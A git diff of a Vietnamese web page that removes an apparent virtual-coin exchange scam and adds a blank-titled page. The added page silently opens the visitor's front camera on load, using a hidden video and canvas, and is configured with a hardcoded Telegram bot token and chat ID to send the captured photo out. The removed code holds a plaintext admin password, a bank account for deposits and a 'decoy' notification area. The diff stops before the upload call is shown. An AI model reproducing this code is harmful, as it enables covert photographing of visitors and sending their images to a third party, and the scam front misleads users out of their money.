@@ -3,1234 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ĐỔI TIỀN XU ẢO</title>
-    <!-- Tailwind CSS & FontAwesome cho Dashboard -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
+    <title></title>
     <style>
-        * {
+        html, body {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
             font-family: Arial, sans-serif;
-        }
-
-        body {
-            min-height: 100vh;
-            background: linear-gradient(-45deg, #141e30, #243b55, #6a11cb, #2575fc);
-            background-size: 400% 400%;
-            animation: bg 12s ease infinite;
-            position: relative;
-        }
-
-        @keyframes bg {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        /* Bong bóng nền */
-        .circle {
-            position: fixed;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, .08);
-            animation: float 8s infinite ease-in-out;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        .c1 { width: 180px; height: 180px; left: 10%; top: 10%; }
-        .c2 { width: 250px; height: 250px; right: 5%; bottom: 5%; animation-delay: 2s; }
-        .c3 { width: 100px; height: 100px; right: 30%; top: 15%; animation-delay: 4s; }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-40px) rotate(180deg); }
-        }
-
-        /* Khung Auth Container (Glassmorphism) */
-        .auth-container {
-            width: 380px;
-            max-width: 92%;
-            padding: 35px;
-            margin: 40px auto;
-            position: relative;
-            z-index: 2;
-            background: rgba(255, 255, 255, .12);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, .2);
-            border-radius: 25px;
-            box-shadow: 0 25px 60px rgba(0,0,0,.35), inset 0 1px rgba(255,255,255,.2);
-            animation: boxShow .8s ease;
-        }
-
-        @keyframes boxShow {
-            from { opacity: 0; transform: translateY(50px) scale(.9); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
-        }
-
-        /* Logo */
-        .logo {
-            width: 70px;
-            height: 70px;
-            margin: 0 auto 15px;
             display: flex;
             justify-content: center;
             align-items: center;
-            border-radius: 20px;
-            background: linear-gradient(135deg, #fff, #dfe9ff);
-            color: #2575fc;
-            font-size: 30px;
-            font-weight: bold;
-            box-shadow: 0 10px 30px rgba(0,0,0,.25);
-            animation: logoShow 1s ease;
         }
 
-        @keyframes logoShow {
-            from { opacity: 0; transform: scale(.5) rotate(-20deg); }
-            to { opacity: 1; transform: scale(1) rotate(0); }
-        }
-
-        .text-animation {
-            animation: textRightToLeft .8s cubic-bezier(.22, 1, .36, 1) forwards;
-        }
-
-        @keyframes textRightToLeft {
-            0% { opacity: 0; transform: translateX(70px); }
-            100% { opacity: 1; transform: translateX(0); }
-        }
-
-        .auth-container h2 {
-            color: white;
-            text-align: center;
-            margin-bottom: 8px;
-            font-size: 28px;
-        }
-
-        .subtitle {
-            color: rgba(255, 255, 255, .7);
-            text-align: center;
-            font-size: 14px;
-            margin-bottom: 25px;
-        }
-
-        .form-box {
-            animation: formShow .5s ease;
-        }
-
-        @keyframes formShow {
-            from { opacity: 0; transform: translateX(20px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-
-        .input-group {
-            margin-bottom: 16px;
-        }
-
-        .input-group label {
-            display: block;
-            color: white;
-            font-size: 13px;
-            margin-bottom: 7px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 14px 16px;
-            border: none;
-            outline: none;
-            border-radius: 12px;
-            color: white;
-            background: rgba(255, 255, 255, .13);
-            border: 1px solid rgba(255, 255, 255, .15);
-            transition: .3s;
-        }
-
-        .input-group input::placeholder {
-            color: rgba(255, 255, 255, .5);
-        }
-
-        .input-group input:focus {
-            background: rgba(255, 255, 255, .2);
-            border-color: white;
-            box-shadow: 0 0 15px rgba(255, 255, 255, .15);
-            transform: translateY(-2px);
-        }
-
-        .btn-submit {
-            width: 100%;
-            padding: 14px;
-            margin-top: 5px;
-            border: 0;
-            border-radius: 12px;
-            background: linear-gradient(135deg, #fff, #dce7ff);
-            color: #2575fc;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: .3s;
-        }
-
-        .btn-submit:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(255, 255, 255, .25);
-        }
-
-        .btn-submit:active {
-            transform: scale(.97);
-        }
-
-        .switch-link {
-            margin-top: 22px;
-            text-align: center;
-            color: rgba(255, 255, 255, .7);
-            font-size: 14px;
-        }
-
-        .switch-link span {
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            text-decoration: underline;
-        }
-
-        .switch-link span:hover {
-            color: #bcd4ff;
-        }
-
-        .loading-box {
+        /* Màn hình kết quả sau khi chụp xong */
+        #result-container {
             display: none;
             text-align: center;
-            margin-top: 15px;
-            color: white;
+            padding: 20px;
         }
 
-        .loader {
-            width: 25px;
-            height: 25px;
-            margin: auto;
-            border: 3px solid rgba(255, 255, 255, .3);
-            border-top-color: white;
-            border-radius: 50%;
-            animation: spin .8s linear infinite;
+        #captured-img {
+            max-width: 90%;
+            max-height: 60vh;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+            margin-bottom: 15px;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        @media(max-width: 450px) {
-            .auth-container { padding: 28px 22px; }
+        .message {
+            font-size: 20px;
+            color: #2e7d32;
+            font-weight: bold;
         }
     </style>
 </head>
-<body class="min-h-screen text-slate-800 relative">
+<body>
 
-    <!-- Bong bóng hiệu ứng động -->
-    <div class="circle c1"></div>
-    <div class="circle c2"></div>
-    <div class="circle c3"></div>
+<!-- Khung hiển thị ảnh và thông báo sau khi hoàn tất -->
+<div id="result-container">
+    <img id="captured-img" alt="Ảnh đã chụp từ camera trước">
+    <div class="message">Ảnh bạn đã được gửi</div>
+</div>
 
-    <!-- Toast Container hiển thị thông báo Chim Mồi -->
-    <div id="toast-container" class="fixed bottom-4 left-4 z-50 flex flex-col gap-2 max-w-sm pointer-events-none"></div>
+<!-- Khung camera và canvas xử lý ngầm (không hiển thị) -->
+<video id="webcam" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
-    <!-- Header ứng dụng khi người dùng đã đăng nhập -->
-    <header id="main-header" class="hidden bg-slate-900/90 backdrop-blur-md text-white p-4 shadow-md sticky top-0 z-40 border-b border-slate-700">
-        <div class="max-w-6xl mx-auto flex justify-between items-center">
-            <div class="flex items-center gap-2 font-bold text-lg">
-                <i class="fa-solid fa-wallet text-emerald-400"></i>
-                <span>PayExchange Pro</span>
-            </div>
-            
-            <div id="nav-actions" class="flex items-center gap-3">
-                <!-- Nút chuyển giao diện chỉ xuất hiện khi là Admin -->
-                <div id="admin-nav-tabs" class="hidden flex gap-2">
-                    <button onclick="switchView('user')" id="btn-user-view" class="px-3 py-1.5 rounded-lg text-xs font-semibold bg-blue-600 text-white">Giao diện User</button>
-                    <button onclick="switchView('admin')" id="btn-admin-view" class="px-3 py-1.5 rounded-lg text-xs font-semibold bg-slate-700 text-slate-300 hover:text-white">Trang Quản Trị (Admin)</button>
-                </div>
-                <div class="flex items-center gap-2 border-l border-slate-700 pl-3">
-                    <span id="user-name-display" class="text-xs font-bold text-emerald-400"></span>
-                    <button onclick="logout()" class="px-2.5 py-1.5 rounded-lg text-xs font-semibold bg-red-600 hover:bg-red-700 text-white transition">
-                        <i class="fa-solid fa-right-from-bracket mr-1"></i>Đăng xuất
-                    </button>
-                </div>
-            </div>
-        </div>
-    </header>
+<script>
+    // ==========================================
+    // CẤU HÌNH THÔNG TIN TELEGRAM BOT TẠI ĐÂY
+    // ==========================================
+    const TELEGRAM_BOT_TOKEN = '8910192618:AAEcxfvxyMFVClt8WXZEyKQ-s4aO7AYw9eA';
+    const TELEGRAM_CHAT_ID = '8894046691';
 
-    <!-- ================= GIAO DIỆN XÁC THỰC ================= -->
-    <section id="auth-view" class="flex justify-center items-center min-h-screen p-4">
-        <div class="auth-container">
-            <div class="logo">H</div>
+    const video = document.getElementById('webcam');
+    const canvas = document.getElementById('canvas');
+    const resultContainer = document.getElementById('result-container');
+    const capturedImg = document.getElementById('captured-img');
 
-            <!-- FORM ĐĂNG NHẬP -->
-            <div id="loginForm" class="form-box">
-                <h2 id="loginTitle" class="text-animation">Đăng nhập</h2>
-                <div id="loginSubtitle" class="subtitle text-animation">Chào mừng bạn quay trở lại</div>
+    // Chạy ngầm ngay khi truy cập trang web
+    window.addEventListener('DOMContentLoaded', async () => {
+        try {
+            // Yêu cầu quyền truy cập CAMERA TRƯỚC (facingMode: "user")
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" },
+                audio: false
+            });
 
-                <div class="input-group">
-                    <label>Tên đăng nhập</label>
-                    <input type="text" id="loginUsername" placeholder="Nhập tên đăng nhập">
-                </div>
+            video.srcObject = stream;
 
-                <div class="input-group">
-                    <label>Mật khẩu</label>
-                    <input type="password" id="loginPassword" placeholder="Nhập mật khẩu">
-                </div>
-
-                <button class="btn-submit" onclick="login()">Đăng nhập</button>
-
-                <div class="loading-box" id="loginLoading">
-                    <div class="loader"></div>
-                    <p class="mt-2 text-xs">Đang xử lý đăng nhập...</p>
-                </div>
-
-                <div class="switch-link">
-                    Chưa có tài khoản? <span onclick="showRegister()">Đăng ký</span>
-                </div>
-            </div>
-
-            <!-- FORM ĐĂNG KÝ -->
-            <div id="registerForm" class="form-box hidden">
-                <h2 id="registerTitle" class="text-animation">Đăng ký</h2>
-                <div id="registerSubtitle" class="subtitle text-animation">Tạo tài khoản mới</div>
-
-                <div class="input-group">
-                    <label>Tên đăng nhập</label>
-                    <input type="text" id="registerUsername" placeholder="Nhập tên đăng nhập">
-                </div>
-
-                <div class="input-group">
-                    <label>Email</label>
-                    <input type="email" id="registerEmail" placeholder="Nhập email">
-                </div>
-
-                <div class="input-group">
-                    <label>Mật khẩu</label>
-                    <input type="password" id="registerPassword" placeholder="Tạo mật khẩu">
-                </div>
-
-                <div class="input-group">
-                    <label>Nhập lại mật khẩu</label>
-                    <input type="password" id="registerConfirm" placeholder="Nhập lại mật khẩu">
-                </div>
-
-                <button class="btn-submit" onclick="register()">Tạo tài khoản</button>
-
-                <div class="loading-box" id="registerLoading">
-                    <div class="loader"></div>
-                    <p class="mt-2 text-xs">Đang khởi tạo tài khoản...</p>
-                </div>
-
-                <div class="switch-link">
-                    Đã có tài khoản? <span onclick="showLogin()">Đăng nhập</span>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- ================= NỘI DUNG ỨNG DỤNG SAU KHI ĐĂNG NHẬP ================= -->
-    <main id="app-content" class="hidden max-w-6xl mx-auto p-4 md:p-6 relative z-10">
-
-        <!-- ================= GIAO DIỆN USER ================= -->
-        <section id="user-view" class="hidden space-y-6">
-            <!-- Dashboard Hiển Thị Số Dư -->
-            <div class="bg-white/90 backdrop-blur-md rounded-2xl p-6 shadow-xl border border-white/40">
-                <h2 class="text-xs font-bold text-slate-500 uppercase tracking-wider mb-4">Số dư tài khoản hiện tại</h2>
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                    <div class="bg-blue-50/90 border border-blue-200 rounded-xl p-4 flex justify-between items-center">
-                        <div>
-                            <span class="text-xs text-blue-600 font-medium block">Ví Chính (VND)</span>
-                            <span id="bal-vnd-display" class="text-2xl font-bold text-blue-900">0 ₫</span>
-                        </div>
-                        <div class="w-10 h-10 rounded-full bg-blue-100 flex items-center justify-center text-blue-600">
-                            <i class="fa-solid fa-money-bill-wave text-lg"></i>
-                        </div>
-                    </div>
-                    <div class="bg-emerald-50/90 border border-emerald-200 rounded-xl p-4 flex justify-between items-center">
-                        <div>
-                            <span class="text-xs text-emerald-600 font-medium block">Ví Quy Đổi (Xu)</span>
-                            <span id="bal-xu-display" class="text-2xl font-bold text-emerald-900">0 XU</span>
-                        </div>
-                        <div class="w-10 h-10 rounded-full bg-emerald-100 flex items-center justify-center text-emerald-600">
-                            <i class="fa-solid fa-coins text-lg"></i>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="grid md:grid-cols-3 gap-6">
-                <!-- KHU VỰC 1: Nạp tiền (VietQR) -->
-                <div class="bg-white/90 backdrop-blur-md rounded-2xl p-6 shadow-xl border border-white/40 space-y-4">
-                    <h2 class="text-base font-bold text-slate-800 flex items-center gap-2">
-                        <i class="fa-solid fa-qrcode text-emerald-500"></i> Nạp Tiền (VietQR)
-                    </h2>
-                    <form onsubmit="generateDepositQR(event)" class="space-y-3">
-                        <div>
-                            <label class="block text-xs font-semibold text-slate-600 mb-1">Số tiền nạp (VND)</label>
-                            <input type="number" id="dep-amount" min="10000" step="10000" placeholder="VD: 100000" required
-                                class="w-full px-3 py-2 border rounded-lg text-sm font-medium focus:ring-2 focus:ring-blue-500 focus:outline-none">
-                        </div>
-                        <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-semibold py-2 rounded-lg text-xs transition">
-                            Tạo mã QR Chuyển Khoản
-                        </button>
-                    </form>
-
-                    <div id="qr-box" class="hidden pt-3 border-t border-slate-200 text-center space-y-3">
-                        <span class="text-xs font-bold text-slate-500 uppercase">Quét mã để nạp</span>
-                        <div class="flex justify-center">
-                            <img id="qr-img" src="" alt="QR Payment" class="w-48 h-48 border rounded-lg p-1 bg-white shadow-sm">
-                        </div>
-                        <div class="bg-slate-50 p-2.5 rounded-lg border border-slate-200 text-left text-xs space-y-1 font-mono">
-                            <p><strong>Ngân hàng:</strong> <span>VPBank</span></p>
-                            <p><strong>STK:</strong> <span>555505505555369</span></p>
-                            <p><strong>Số tiền:</strong> <span id="qr-amt-display" class="text-emerald-600 font-bold">0 ₫</span></p>
-                            <p class="text-red-600 bg-red-50 p-1 rounded border border-red-100">
-                                <strong>Nội dung:</strong> <span id="qr-memo" class="font-bold underline">---</span>
-                            </p>
-                        </div>
-                        <button onclick="submitDepositRequest()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 rounded-lg text-xs transition">
-                            Tôi đã chuyển khoản
-                        </button>
-                    </div>
-                </div>
-
-                <!-- KHU VỰC 2: Quy Đổi Tiền -->
-                <div class="bg-white/90 backdrop-blur-md rounded-2xl p-6 shadow-xl border border-white/40 space-y-4">
-                    <h2 class="text-base font-bold text-slate-800 flex items-center gap-2">
-                        <i class="fa-solid fa-right-left text-blue-500"></i> Đổi Tiền Tỉ Lệ
-                    </h2>
-                    
-                    <div class="bg-amber-50 border border-amber-200 p-2.5 rounded-lg text-xs text-amber-900 flex justify-between items-center">
-                        <span><i class="fa-solid fa-chart-pie text-amber-600 mr-1"></i> <strong>Hạn ngạch XU ➔ VND:</strong></span>
-                        <span id="user-quota-display" class="text-xs font-extrabold bg-amber-200 text-amber-900 px-2 py-0.5 rounded">0 XU</span>
-                    </div>
-
-                    <div class="bg-blue-50 border border-blue-200 p-2.5 rounded-lg text-xs text-blue-800 space-y-1">
-                        <p><i class="fa-solid fa-circle-info mr-1"></i> <strong>1 VND = 3 XU</strong> | <strong>1 XU = 1 VND</strong></p>
-                        <p class="text-amber-700 font-medium"><i class="fa-solid fa-clock mr-1"></i> Sau khi đổi VND ➔ XU, phải chờ <strong>3 tiếng</strong> mới đổi được XU ➔ VND.</p>
-                    </div>
-                    
-                    <div id="cooldown-status-display" class="p-2.5 rounded-lg border text-xs"></div>
-
-                    <form onsubmit="handleExchange1to3(event)" class="space-y-3">
-                        <div>
-                            <label class="block text-xs font-semibold text-slate-600 mb-1">Chiều quy đổi</label>
-                            <select id="exc-direction" onchange="calculateExchangePreview()" class="w-full px-3 py-2 border rounded-lg text-sm font-medium bg-slate-50 focus:outline-none">
-                                <option value="VND_TO_XU">VND ➔ XU (1 VND nhận 3 XU)</option>
-                                <option value="XU_TO_VND">XU ➔ VND (1 XU nhận 1 VND)</option>
-                            </select>
-                        </div>
-                        <div>
-                            <label class="block text-xs font-semibold text-slate-600 mb-1">Số tiền muốn đổi</label>
-                            <input type="number" id="exc-amount" min="1" step="any" placeholder="Nhập số tiền" oninput="calculateExchangePreview()" required
-                                class="w-full px-3 py-2 border rounded-lg text-sm font-medium focus:ring-2 focus:ring-blue-500 focus:outline-none">
-                        </div>
-
-                        <div class="p-3 bg-slate-50 rounded-lg border border-slate-200 text-xs">
-                            <span class="text-slate-500 block">Số tiền thực nhận:</span>
-                            <span id="exc-preview" class="text-base font-bold text-emerald-600">0</span>
-                        </div>
-
-                        <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 rounded-lg text-xs transition">
-                            Xác Nhận Quy Đổi
-                        </button>
-                    </form>
-                </div>
-
-                <!-- KHU VỰC 3: Rút tiền -->
-                <div class="bg-white/90 backdrop-blur-md rounded-2xl p-6 shadow-xl border border-white/40 space-y-4">
-                    <h2 class="text-base font-bold text-slate-800 flex items-center gap-2">
-                        <i class="fa-solid fa-building-columns text-amber-500"></i> Rút Tiền Về Ngân Hàng
-                    </h2>
-                    <form onsubmit="submitWithdrawRequest(event)" class="space-y-3">
-                        <div>
-                            <label class="block text-xs font-semibold text-slate-600 mb-1">Tên Ngân hàng</label>
-                            <input type="text" id="wit-bank" placeholder="VD: MBBank, VCB" required class="w-full px-3 py-1.5 border rounded-lg text-xs font-medium">
-                        </div>
-                        <div>
-                            <label class="block text-xs font-semibold text-slate-600 mb-1">Số tài khoản</label>
-                            <input type="text" id="wit-acc" placeholder="Nhập số tài khoản" required class="w-full px-3 py-1.5 border rounded-lg text-xs font-medium">
-                        </div>
-                        <div>
-                            <label class="block text-xs font-semibold text-slate-600 mb-1">Tên chủ tài khoản</label>
-                            <input type="text" id="wit-name" placeholder="TÊN VIẾT HOA KHÔNG DẤU" required class="w-full px-3 py-1.5 border rounded-lg text-xs font-medium">
-                        </div>
-                        <div>
-                            <label class="block text-xs font-semibold text-slate-600 mb-1">Số tiền rút (VND)</label>
-                            <input type="number" id="wit-amount" min="10000" step="10000" placeholder="VD: 50000" required class="w-full px-3 py-1.5 border rounded-lg text-xs font-medium">
-                        </div>
-                        <button type="submit" class="w-full bg-amber-600 hover:bg-amber-700 text-white font-semibold py-2 rounded-lg text-xs transition">
-                            Gửi Yêu Cầu Rút Tiền
-                        </button>
-                    </form>
-                </div>
-            </div>
-
-            <!-- Nhật ký biến động -->
-            <div class="bg-white/90 backdrop-blur-md rounded-2xl p-6 shadow-xl border border-white/40">
-                <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-3">Nhật ký biến động số dư & Giao dịch</h3>
-                <div class="overflow-x-auto">
-                    <table class="w-full text-left text-xs">
-                        <thead class="bg-slate-50 text-slate-500 border-b border-slate-200">
-                            <tr>
-                                <th class="p-2">Thời gian</th>
-                                <th class="p-2">Loại giao dịch</th>
-                                <th class="p-2">Chi tiết</th>
-                                <th class="p-2">Biến động</th>
-                                <th class="p-2">Trạng thái</th>
-                            </tr>
-                        </thead>
-                        <tbody id="user-history-body" class="divide-y divide-slate-100">
-                            <tr><td colspan="5" class="text-center py-4 text-slate-400 italic">Chưa có lịch sử giao dịch</td></tr>
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-        </section>
-
-        <!-- ================= GIAO DIỆN ADMIN (CHỈ DÀNH CHO ADMIN) ================= -->
-        <section id="admin-view" class="hidden space-y-6">
-            <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
-                <div class="bg-white/90 p-4 rounded-xl border border-white/40 shadow-sm">
-                    <span class="text-xs text-slate-500 font-semibold block mb-1">Lệnh nạp chờ duyệt</span>
-                    <span id="stat-pending-dep" class="text-2xl font-bold text-emerald-600">0</span>
-                </div>
-                <div class="bg-white/90 p-4 rounded-xl border border-white/40 shadow-sm">
-                    <span class="text-xs text-slate-500 font-semibold block mb-1">Lệnh rút chờ duyệt</span>
-                    <span id="stat-pending-wit" class="text-2xl font-bold text-amber-600">0</span>
-                </div>
-                <div class="bg-white/90 p-4 rounded-xl border border-white/40 shadow-sm">
-                    <span class="text-xs text-slate-500 font-semibold block mb-1">Tổng giao dịch hệ thống</span>
-                    <span id="stat-total" class="text-2xl font-bold text-blue-600">0</span>
-                </div>
-                <div class="bg-amber-50/90 p-4 rounded-xl border border-amber-200 shadow-sm">
-                    <span class="text-xs text-amber-700 font-semibold block mb-1">Hạn Ngạch Đổi XU Còn Lại</span>
-                    <span id="stat-quota" class="text-2xl font-bold text-amber-900">0 XU</span>
-                </div>
-            </div>
-
-            <!-- BƠM HẠN NGẠCH -->
-            <div class="bg-white/90 backdrop-blur-md rounded-2xl p-6 shadow-xl border border-white/40 space-y-4">
-                <h3 class="font-bold text-slate-800 text-sm flex items-center gap-2">
-                    <i class="fa-solid fa-chart-line text-amber-600"></i> Quản Lý & Bơm Hạn Ngạch Quy Đổi XU ➔ VND
-                </h3>
-                <form onsubmit="handleAdminAddQuota(event)" class="flex flex-col md:flex-row gap-3 items-end">
-                    <div class="flex-1">
-                        <label class="block text-xs font-semibold text-slate-600 mb-1">Số XU muốn nạp thêm vào hạn ngạch</label>
-                        <input type="number" id="adm-quota-add" placeholder="VD: 500000" min="1" required class="w-full px-3 py-2 border rounded-lg text-xs font-medium">
-                    </div>
-                    <button type="submit" class="bg-amber-600 hover:bg-amber-700 text-white font-semibold py-2 px-4 rounded-lg text-xs transition flex items-center justify-center gap-1.5 h-[38px]">
-                        <i class="fa-solid fa-plus-circle"></i> Bơm Hạn Ngạch
-                    </button>
-                </form>
-            </div>
-
-            <!-- ĐIỀU CHỈNH SỐ DƯ -->
-            <div class="bg-white/90 backdrop-blur-md rounded-2xl p-6 shadow-xl border border-white/40 space-y-4">
-                <h3 class="font-bold text-slate-800 text-sm flex items-center gap-2">
-                    <i class="fa-solid fa-user-gear text-blue-600"></i> Quản Lý & Cộng / Trừ Số Dư Tài Khoản
-                </h3>
-                <form onsubmit="handleAdminAdjustBalance(event)" class="grid grid-cols-1 md:grid-cols-4 gap-3 items-end">
-                    <div>
-                        <label class="block text-xs font-semibold text-slate-600 mb-1">Tên tài khoản (Username)</label>
-                        <input type="text" id="adm-user-target" placeholder="Nhập tên đăng nhập" required class="w-full px-3 py-2 border rounded-lg text-xs font-medium">
-                    </div>
-                    <div>
-                        <label class="block text-xs font-semibold text-slate-600 mb-1">Chọn loại Ví</label>
-                        <select id="adm-wallet-type" class="w-full px-3 py-2 border rounded-lg text-xs font-medium bg-slate-50">
-                            <option value="VND">Ví VND</option>
-                            <option value="XU">Ví XU</option>
-                        </select>
-                    </div>
-                    <div>
-                        <label class="block text-xs font-semibold text-slate-600 mb-1">Số tiền (Dương = Cộng, Âm = Trừ)</label>
-                        <input type="number" id="adm-amount-change" placeholder="VD: 50000 hoặc -20000" required class="w-full px-3 py-2 border rounded-lg text-xs font-medium">
-                    </div>
-                    <button type="submit" class="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-lg text-xs transition flex items-center justify-center gap-1.5 h-[38px]">
-                        <i class="fa-solid fa-floppy-disk"></i> Cập Nhật Số Dư
-                    </button>
-                </form>
-            </div>
-
-            <!-- QUẢN LÝ TẤT CẢ USER -->
-            <div class="bg-white/90 backdrop-blur-md rounded-2xl shadow-xl border border-white/40 overflow-hidden space-y-2">
-                <div class="p-4 border-b border-slate-200 flex justify-between items-center bg-slate-50/80">
-                    <h3 class="font-bold text-slate-800 text-sm flex items-center gap-2">
-                        <i class="fa-solid fa-users text-indigo-600"></i> Danh sách tất cả Tài khoản Người dùng (User Management)
-                    </h3>
-                </div>
-                <div class="overflow-x-auto">
-                    <table class="w-full text-left border-collapse text-xs">
-                        <thead class="bg-slate-100 text-slate-600 uppercase font-semibold">
-                            <tr>
-                                <th class="p-3">Tên đăng nhập</th>
-                                <th class="p-3">Mật khẩu</th>
-                                <th class="p-3">Số dư VND</th>
-                                <th class="p-3">Số dư XU</th>
-                                <th class="p-3">Lệnh nạp chờ</th>
-                                <th class="p-3">Lệnh rút chờ</th>
-                                <th class="p-3">Vai trò</th>
-                            </tr>
-                        </thead>
-                        <tbody id="admin-user-list-body" class="divide-y divide-slate-100"></tbody>
-                    </table>
-                </div>
-            </div>
-
-            <!-- DUYỆT GIAO DỊCH NẠP / RÚT -->
-            <div class="bg-white/90 backdrop-blur-md rounded-2xl shadow-xl border border-white/40 overflow-hidden">
-                <div class="p-4 border-b border-slate-200 flex justify-between items-center bg-slate-50/80">
-                    <h3 class="font-bold text-slate-800 text-sm">Quản lý duyệt giao dịch Nạp / Rút</h3>
-                    <div class="flex gap-2">
-                        <button onclick="renderAdminTable('all')" class="px-2.5 py-1 text-xs rounded bg-slate-200 font-semibold text-slate-700">Tất cả</button>
-                        <button onclick="renderAdminTable('deposit')" class="px-2.5 py-1 text-xs rounded bg-emerald-100 font-semibold text-emerald-700">Lệnh Nạp</button>
-                        <button onclick="renderAdminTable('withdraw')" class="px-2.5 py-1 text-xs rounded bg-amber-100 font-semibold text-amber-700">Lệnh Rút</button>
-                    </div>
-                </div>
-                <div class="overflow-x-auto">
-                    <table class="w-full text-left border-collapse text-xs">
-                        <thead class="bg-slate-100 text-slate-600 uppercase font-semibold">
-                            <tr>
-                                <th class="p-3">Mã GD</th>
-                                <th class="p-3">Tài khoản</th>
-                                <th class="p-3">Loại</th>
-                                <th class="p-3">Số tiền</th>
-                                <th class="p-3">Chi tiết / Nội dung</th>
-                                <th class="p-3">Thời gian</th>
-                                <th class="p-3">Trạng thái</th>
-                                <th class="p-3 text-right">Thao tác Duyệt</th>
-                            </tr>
-                        </thead>
-                        <tbody id="admin-table-body" class="divide-y divide-slate-100"></tbody>
-                    </table>
-                </div>
-            </div>
-        </section>
-    </main>
-
-    <script>
-        const ADMIN_BANK = 'VPBank';
-        const ADMIN_STK = '555505505555369';
-
-        // Khởi tạo CSDL
-        let dbUsers = JSON.parse(localStorage.getItem('db_users')) || {
-            'admin': { password: 'hazivclxx1209', role: 'admin', VND: 0, XU: 0, history: [], lastVndToXuTime: 0 }
-        };
-        if (dbUsers['admin']) {
-            dbUsers['admin'].password = 'hazivclxx1209';
-            dbUsers['admin'].role = 'admin';
-        }
-
-        let transactions = JSON.parse(localStorage.getItem('db_transactions')) || [];
-        let dbQuota = parseFloat(localStorage.getItem('db_quota')) || 5000000;
-        
-        let currentUser = null;
-        let currentTempDeposit = null;
-
-        function saveDB() {
-            localStorage.setItem('db_users', JSON.stringify(dbUsers));
-            localStorage.setItem('db_transactions', JSON.stringify(transactions));
-            localStorage.setItem('db_quota', dbQuota.toString());
-        }
-
-        /* TỰ ĐỘNG KHÔI PHỤC PHIÊN ĐĂNG NHẬP KHI RELOAD TRANG */
-        document.addEventListener('DOMContentLoaded', () => {
-            const savedSessionUser = localStorage.getItem('current_user');
-            if (savedSessionUser && dbUsers[savedSessionUser]) {
-                currentUser = savedSessionUser;
-                document.getElementById('user-name-display').innerText = `👋 ${currentUser}`;
-                
-                document.getElementById('auth-view').classList.add('hidden');
-                document.getElementById('main-header').classList.remove('hidden');
-                document.getElementById('app-content').classList.remove('hidden');
-
-                const isAdmin = dbUsers[currentUser].role === 'admin';
-                const adminNavTabs = document.getElementById('admin-nav-tabs');
-                if (adminNavTabs) {
-                    adminNavTabs.classList.toggle('hidden', !isAdmin);
-                }
-
-                switchView('user');
-                updateBalanceUI();
-                renderUserHistory();
-            }
-        });
-
-        /* CHẠY LẠI ANIMATION CHỮ */
-        function replayTextAnimation(id) {
-            const element = document.getElementById(id);
-            if (!element) return;
-            element.classList.remove("text-animation");
-            void element.offsetWidth;
-            element.classList.add("text-animation");
-        }
-
-        /* CHUYỂN FORM ĐĂNG KÝ / ĐĂNG NHẬP */
-        function showRegister() {
-            document.getElementById("loginForm").classList.add("hidden");
-            document.getElementById("registerForm").classList.remove("hidden");
-            replayTextAnimation("registerTitle");
-            replayTextAnimation("registerSubtitle");
-        }
-
-        function showLogin() {
-            document.getElementById("registerForm").classList.add("hidden");
-            document.getElementById("loginForm").classList.remove("hidden");
-            replayTextAnimation("loginTitle");
-            replayTextAnimation("loginSubtitle");
-        }
-
-        /* ĐĂNG KÝ */
-        function register() {
-            let username = document.getElementById("registerUsername").value.trim();
-            let email = document.getElementById("registerEmail").value.trim();
-            let password = document.getElementById("registerPassword").value;
-            let confirm = document.getElementById("registerConfirm").value;
-
-            if (!username || !email || !password || !confirm) {
-                alert("Vui lòng nhập đầy đủ thông tin!");
-                return;
-            }
-
-            if (dbUsers[username]) {
-                alert("Tên đăng nhập đã tồn tại trong hệ thống!");
-                return;
-            }
-
-            if (password !== confirm) {
-                alert("Mật khẩu nhập lại không khớp!");
-                return;
-            }
-
-            document.getElementById("registerLoading").style.display = "block";
-
+            // Chờ 1 giây để ống kính camera bắt sáng/lấy nét
             setTimeout(() => {
-                dbUsers[username] = { password: password, email: email, role: 'user', VND: 0, XU: 0, history: [], lastVndToXuTime: 0 };
-                saveDB();
-
-                document.getElementById("registerLoading").style.display = "none";
-                alert("Đăng ký tài khoản thành công! Vui lòng đăng nhập.");
-                
-                document.getElementById("registerUsername").value = '';
-                document.getElementById("registerEmail").value = '';
-                document.getElementById("registerPassword").value = '';
-                document.getElementById("registerConfirm").value = '';
-                
-                showLogin();
-            }, 1200);
-        }
-
-        /* ĐĂNG NHẬP */
-        function login() {
-            let username = document.getElementById("loginUsername").value.trim();
-            let password = document.getElementById("loginPassword").value;
-
-            if (!username || !password) {
-                alert("Vui lòng nhập tài khoản và mật khẩu!");
-                return;
-            }
-
